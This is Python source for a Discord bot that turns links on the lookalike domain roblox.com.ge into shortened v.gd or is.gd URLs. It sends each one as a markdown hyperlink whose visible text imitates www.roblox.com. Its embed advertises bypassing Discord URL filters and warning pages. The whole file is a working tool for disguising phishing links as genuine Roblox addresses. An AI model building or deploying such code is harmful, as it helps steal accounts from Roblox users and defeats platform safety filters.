import os
import discord
from discord import ui, app_commands
from discord.ext import commands
import aiohttp
import re
import asyncio

TOKEN = os.getenv("TOKEN")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

class LinkModal(ui.Modal, title="Paste Your Roblox Link"):
    def __init__(self):
        super().__init__(timeout=300)
    
    link = ui.TextInput(
        label="Roblox Link *",
        placeholder="https://roblox.com.ge/users/123456/profile\nили\nhttps://roblox.com.ge/games/123456/Game?privateServerLinkCode=xxx",
        style=discord.TextStyle.paragraph,
        required=True
    )
    
    def format_display_url(self, original_url):
        """Преобразует ссылку в формат https*://*www.roblox.com/путь"""
        # Убираем домен roblox.com.ge, оставляем путь
        match = re.search(r'roblox\.com\.ge(.*)', original_url)
        if match:
            path = match.group(1)
        else:
            path = re.sub(r'^https?://[^/]+', '', original_url)
        
        # Формируем итоговую ссылку
        return f"https*://*www.roblox.com{path}"
    
    async def shorten_url(self, session, original_url):
        """Сокращает ссылку через v.gd"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            data = {'url': original_url, 'shorturl': '', 'Publish': 'Create'}
            async with session.post('https://v.gd/create.php', data=data, headers=headers, timeout=15) as resp:
                text = await resp.text()
                match = re.search(r'https://v\.gd/[a-zA-Z0-9]+', text)
                if match:
                    return match.group(0)
        except Exception as e:
            print(f"v.gd failed: {e}")
        
        # Если v.gd не сработал, пробуем is.gd
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://is.gd',
                'Referer': 'https://is.gd/',
            }
            data = {'url': original_url, 'shorturl': '', 'submit': 'Shorten!'}
            async with session.post('https://is.gd/create.php', data=data, headers=headers, timeout=15) as resp:
                text = await resp.text()
                match = re.search(r'https://is\.gd/[a-zA-Z0-9]+', text)
                if match:
                    return match.group(0)
        except Exception as e:
            print(f"is.gd failed: {e}")
        
        return None
    
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True, thinking=True)
        
        original_url = self.link.value.strip()
        if not original_url.startswith(('http://', 'https://')):
            original_url = 'https://' + original_url
        
        try:
            async with aiohttp.ClientSession() as session:
                short_url = await self.shorten_url(session, original_url)
            
            if short_url:
                # Форматируем отображаемую ссылку (без .ge)
                display_url = self.format_display_url(original_url)
                # Создаём сообщение в формате [ссылка_для_отображения](короткая_ссылка)
                message = f"[{display_url}]({short_url})"
                await interaction.user.send(message)
                await interaction.followup.send("✅ Done! Check your DMs.", ephemeral=True)
            else:
                await interaction.followup.send("❌ Failed to shorten link. Try again later.", ephemeral=True)
        except Exception as e:
            print(f"Error: {e}")
            await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="linkhider", description="Hide your Roblox link (profile or private server)")
async def linkhider(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔗 LINK HIDER",
        description=(
            "**Hide your link and bypass Discord warnings & errors**\n\n"
            "**WHAT IS LINK HIDER?**\n"
            "• A tool that converts your Roblox link into a safe format\n\n"
            "**WHY USE IT?**\n"
            "• No more warning pages\n"
            "• Bypass Discord URL filters\n"
            "• Works with profile and private server links\n"
            "• Clean redirects\n\n"
            "**HOW IT WORKS**\n"
            "1. Click 'CREATE HYPERLINK' below\n"
            "2. Paste your Roblox link\n"
            "3. Get your hidden link in DMs\n"
            "4. Share safely anywhere"
        ),
        color=discord.Color.blue()
    )
    embed.set_footer(text="GODZILLA • Link Hider")
    view = discord.ui.View()
    view.add_item(discord.ui.Button(
        label="CREATE HYPERLINK",
        style=discord.ButtonStyle.primary,
        custom_id="create_link"
    ))
    await interaction.response.send_message(embed=embed, view=view)

@bot.event
async def on_interaction(interaction: discord.Interaction):
    if interaction.type == discord.InteractionType.component:
        if interaction.data.get("custom_id") == "create_link":
            await interaction.response.send_modal(LinkModal())

@bot.event
async def on_ready():
    print(f'✅ Bot {bot.user} is online!')
    await bot.tree.sync()
    print("✅ Commands synced!")

if __name__ == "__main__":
    bot.run(TOKEN)
